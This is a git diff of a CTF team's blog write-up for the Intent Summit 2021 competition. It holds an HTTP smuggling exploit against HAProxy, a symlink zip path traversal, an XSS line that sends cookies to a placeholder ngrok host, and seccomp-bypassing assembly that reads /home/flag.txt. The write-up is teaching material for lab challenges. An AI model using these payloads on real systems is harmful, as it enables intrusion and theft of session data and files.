@@ -1,41 +1,81 @@
 ---
-title: "{{ replace .Name "-" " " | title }}"
-date: {{ .Date }}
+title: "Intent Summit 2021 CTF"
+date: 2021-11-16T21:36:08+01:00 
 draft: true
-tags: ["pwn", "rev"]
+tags: ["pwn", "rev", "web", "intent", "bot"]
 author: havce
+description: A fun CTF where we came in eighth out of 90 teams! We focussed mainly on web and rev/pwn challenges. It was really fun!
 ---
 
 | Challenge | Category | Points |
 | --- | ----------- | --- |
-| [Door (un)Locked](#door-unlocked) | web | 100 | 
-| [Careers](#careers) | web | 100 |
-| [GraphiCS](#graphics) | web | 150 |
-| [Etulosba](#etulosba) | web | 200 |
-| [Darknet Club](#darknet-club) | web | 200 |
-| [Flag Vault](#flag-vault) | web | 250 |
-| [Mass Notes](#mass-notes) | web | 250 |
-| [Pattern Institute](#patterni) | pwn | 450 |
-| [Scadomware](#scadomware) | rev | 300 |
-| [Electron](#electron) | bot | 50 |
+| [Door (un)Locked](#door-unlocked) | [web](/tags/web/) | 100 | 
+| [Careers](#careers) | [web](/tags/web/) | 100 |
+| [GraphiCS](#graphics) | [web](/tags/web/) | 150 |
+| [Etulosba](#etulosba) | [web](/tags/web/) | 200 |
+| [Darknet Club](#darknet-club) | [web](/tags/web/) | 200 |
+| [Flag Vault](#flag-vault) | [web](/tags/web/) | 250 |
+| [Mass Notes](#mass-notes) | [web](/tags/web/) | 250 |
+| [Pattern Institute](#pattern-institute) | [pwn](/tags/pwn/) | 450 |
+| [Scadomware](#scadomware) | [rev](/tags/rev/) | 300 |
+| [Electron](#electron) | [bot](/tags/bot/) | 50 |
 
 
 # Door (un)Locked
-### Description
+> Some researchers started deploying a website for their CTF, but something went wrong with the defined policies when trying to hide the flags.
+Can you find the weak link?
 
+**Description**
 
-### Solution
+This challenge presents a plain static website and an attachment called `ha.cfg`, which is the config file for [HAProxy](http://www.haproxy.org/). In the file there are two interesting entries:
+```plaintext
+http-request deny if { path_beg /flag }
+http-request deny if { path,url_dec -m reg ^.*/?flag/?.*$ }
+```
+We can guess that the flag is hidden behind the `/flag` endpoint.
 
+**Solution**
 
+My first approach was to try and break the regex, with disappointing results. I then educated myself on [HTTP Smuggling attacks](https://portswigger.net/web-security/request-smuggling). And guess what?! HAProxy version < 2.0.25, 2.2.17, 2.3.14 and 2.4.4 are vulnerable to an [Integer Overflow attack](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/) that enables HTTP Smuggling!
+
+After a few unfortunate manual takes, I used [this tool](https://github.com/alikarimi999/CVE-2021-40346/blob/main/exploit.py) which worked like a charm.
+
+```plaintext
+...
+HTTP/1.1 200 OK
+server: nginx/1.21.4
+date: Wed, 17 Nov 2021 00:09:42 GMT
+content-type: text/html
+content-length: 29
+last-modified: Fri, 12 Nov 2021 20:51:37 GMT
+etag: "618ed3d9-1d"
+accept-ranges: bytes
+
+INTENT{Smuggl3_w1th_H4_Pr0xy}
+```
 
 # Careers
-### Description
+> We got hacked,
+we're trying to indentify the ROOT cause.
+If you are a l33t h4x0r, please upload your resume.
 
+**Description**
 
-### Solution
+The attached URL brings us to a website which has a *Careers* section, where we can upload our résumé in .txt format, zipped. We are pretty sure we need to tinker with this upload form in order to get our flag.
 
+**Solution**
 
+Well, first things first, when we deal with upload forms and zips, I always try to add - let's say - *interesting* files to my compressed archive.
+```bash
+# Let's try the oldest trick in the book
+ln -fs ../../../../../flag havce.txt
+zip --symlinks havce.zip havce.txt
+```
+Let's apply to this job with this resume. 🤭
 
+```bash
+INTENT{zipfiles_are_awsome_for_pt}
+```
 # GraphiCS
 ### Description
 The challenge presents a website that makes a single query to a GraphQL endpoint. We probably need to extract the flag from there.
@@ -46,7 +86,6 @@ Immediately tried introspection, but it was disabled. Luckily we can abuse the a
 ```json
 {"operationName":"ExampleQuery","variables":{},"query":"query ExampleQuery { _secret { flag } }\n"}
 ```
-
 
 # Etulosba
 ### Description
@@ -111,7 +150,6 @@ location.href="//xxxx-xx-xx-xx-xx.ngrok.io?cookies="+document.cookie;
 
 3) Request a review by the admin
 
-
 # Flag Vault
 ### Description
 The challenge contains a simple login page that seems to never login and is not vulnerable to basic SQLi. JWT tokens also look same after a bit of fuzzing.
@@ -137,22 +175,124 @@ The app simply lets us create notes which are stored on a MongoDB server. I spen
 ### Solution
 A common problem with MongoDB (and NoSQL) implementations is being able to override parameters set in the code with ones of our choice. We can override a couple, but most notably `avatar`. By messing with a bit, we can see that the avatar for our notes is not visible anymore and that an error is returned instead. `../../flag` appears to be a good avatar to get the flag!
 
-
 # Pattern Institute
-### Description
+> It is you against the Pattern Institute!
+> 
+> However, Pattern Institute know what they're up against, so they shut down all their systems, except a sandboxed one, in which they allow only limited operations for their operatives to run.
+> 
+> Our researchers were able to gain hold of the sandbox source code and chain some cool vulnerabilities in Pattern Institute's sandbox, to eventualy get an arbitrary binary to run on that system! but it's been a long time since they've played in the sand.
+> 
+> Your job is to steal an important file from their system's /home folder and report its contents back to headquarters.
 
+**Description**
 
-### Solution
+The challenge attachments included the URL of the remote server and a Go program which constituted the sandbox.
 
+We can execute code on the machine but only a few syscalls are permitted! All the other ones are blocked through a seccomp filter.
 
+*Allowed* syscalls:
+ - mmap
+ - mprotect
+ - write
+ - open
+ - close
+ - fstat
+ - execve
+ - arch_prctl
+ - stat
+ - futex
+ - exit_group
+
+From the challenge description we can guess that we need to exfiltrate `/home/flag.txt`.
+
+**Solution**
+
+My first try was to write a C program that used `open`, `read` and `write`, but libc implements the `open` function with the `openat` syscall, so I cried in `SIGSEGV` and decided to try to write something in amd64 assembly.
+
+So I started to write an asm program that:
+ - `open`-ed the file (`/home/flag.txt`)
+ - `read`-ed the file (yes, I know)
+ - `write`-ed the file to stdout.
+
+Simple, elegant and linear, it worked on my machine™️ but not on the remote one!
+It took me a while (and a Discord message from Gianluca) to realize that the `read` syscall was blocked. Bummer.
+
+From this point on Gianluca took over and the program now:
+ - `open`-ed the file
+ - allocated the `stat` struct on the stack
+ - called `fstat` syscall
+ - `mmap`-ed the file descriptor of the file previously opened to a random place on memory.
+ - `write`-ed to stdout the content of the mapping (the file content, i.e. the flag).
+
+```x86asm=amd64
+global _start
+
+section .text
+
+_start:
+
+  mov     rax, 2          ; "open"
+  mov     rdi, path       ;
+  xor     rsi, rsi        ; O_RDONLY
+  syscall
+
+  mov     rdi, rax        ; fd (returned from open)
+  sub     rsp, 144        ; allocate stat struct
+  mov     rsi, rsp        ; address of 'struct stat'
+  mov     rax, 5          ; "fstat" syscall
+  syscall
+
+  mov     rsi, [rsp+48]   ; len = file size (from 'struct stat')
+  add     rsp, 144        ; free 'struct stat'
+  mov     r8, rdi         ; fd (still in rdi from last syscall)
+  xor     rdi, rdi        ; address = 0
+  mov     rdx, 0x1        ; protection = PROT_READ
+  mov     r10, 0x2        ; flags = MAP_PRIVATE
+  xor     r9, r9          ; offset = 0
+  mov     rax, 9          ; "mmap" syscall
+  syscall
+
+  mov     rdx, rsi        ; count (file size from last call)
+  mov     rsi, rax        ; buffer address (returned from mmap)
+  mov     rdi, 1          ; fd = stdout
+  mov     rax, 1          ; "write" syscall
+  syscall
+
+  mov rax, 231      ;
+  mov rdi, 0        ;   EXIT_SUCCESS
+  syscall           ; );
+
+section .rodata
+  path: db "/home/flag.txt",0
+```
+
+Compile and link with:
+```bash
+nasm -f elf64 -o exploit.o exploit.asm
+ld -o exploit exploit.o
+```
+
+To launch the exploit we needed to convert the binary to base64 and add it to the challenge website query string.
+```python
+import base64
+import urllib.parse
+
+with open('exploit', 'rb') as f:
+    content = f.read()
+
+payload = base64.b64encode(content).decode()
+payload = urllib.parse.quote(payload)
+print("http://patterni.chal.intentsummit.org:9090/?arg="+payload)
+```
+
+```plaintext
+INTENT{pl4y1n6_1n_7h3_54nd_15_d4n63r0u5}
+```
 
 # Scadomware
 ### Description
 
-
 ### Solution
-
-
 
 # Electron
 ### Description
